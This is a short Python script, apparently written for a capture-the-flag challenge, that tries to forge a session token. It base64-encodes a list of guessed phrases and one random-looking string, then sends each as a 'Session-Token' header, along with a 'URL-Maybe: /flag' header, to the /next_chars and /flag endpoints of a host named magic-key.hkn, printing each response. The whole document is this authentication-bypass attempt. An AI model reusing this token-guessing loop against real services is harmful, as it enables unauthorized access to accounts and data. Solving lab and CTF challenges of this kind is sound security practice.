#!/usr/bin/env python3
import base64, requests

def b64(s):
    return base64.b64encode(s.encode()).decode().rstrip("=")

candidates = [
    "this token is good",
    "This token is good",
    "this token IS good",
    "this is a good token",
    "very good session token",
    "very-good-session-token",
    "C%{6bSUAs52sI@$K8Ouk0",
]

for c in candidates:
    token = b64(c)
    print(f"\n### Session-Token = base64({c!r}) = {token} ###")
    for path, char in [("/next_chars", "s"), ("/flag", None)]:
        url = f"http://magic-key.hkn{path}"
        params = {"char": char} if char else None
        r = requests.get(url, params=params, headers={
            "Session-Token": token,
            "URL-Maybe": "/flag"
        }, timeout=5)
        print(f"  GET {path} -> {r.status_code}: {r.text.strip()[:200]}")
